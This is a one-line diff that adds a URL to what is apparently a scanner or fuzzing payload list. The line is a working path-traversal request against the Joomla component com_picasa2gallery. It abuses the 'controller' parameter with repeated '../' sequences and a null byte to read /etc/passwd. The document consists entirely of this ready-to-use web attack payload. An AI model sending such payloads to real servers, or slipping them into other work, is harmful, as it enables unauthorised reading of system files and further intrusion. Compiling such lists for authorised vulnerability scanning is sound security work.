@@ -1,0 +1,1 @@
+/index.php?option=com_picasa2gallery&controller=../../../../../../../../../../../../../../etc/passwd%00
